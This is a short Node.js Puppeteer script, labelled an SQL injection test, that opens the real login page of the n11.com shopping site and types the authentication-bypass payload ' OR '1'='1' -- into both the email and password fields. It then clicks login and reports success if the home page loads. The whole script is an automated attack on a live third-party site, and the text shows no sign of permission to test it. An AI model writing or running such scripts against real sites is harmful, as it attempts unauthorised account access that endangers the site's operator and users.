const puppeteer = require('puppeteer');

async function performSqlInjectionTest() {
  const browser = await puppeteer.launch({ headless: false }); 
  const page = await browser.newPage();

  try {
    await page.goto('https://www.n11.com/', { timeout: 20000 });

    const signInButtonSelector = 'a.btnSignIn';

    await page.click(signInButtonSelector);

    await page.waitForSelector('input[name="email"]');
    await page.waitForSelector('input[name="password"]');

    const maliciousUsername = "' OR '1'='1' -- ";
    const maliciousPassword = "' OR '1'='1' -- ";

    await page.type('input[name="email"]', maliciousUsername);
    await page.type('input[name="password"]', maliciousPassword);

    await page.click('div#loginButton');

    const pageTitle = await page.title();
    if (pageTitle.includes('Ana Sayfa')) {
      console.log('SQL Injection Test Passed - Login Successful!');
    } else {
      console.error('SQL Injection Test Failed - Login Failed!');
    }
  } catch (error) {
    console.error('An error occurred:', error);
  } finally {
    await browser.close();
  }
}

performSqlInjectionTest();
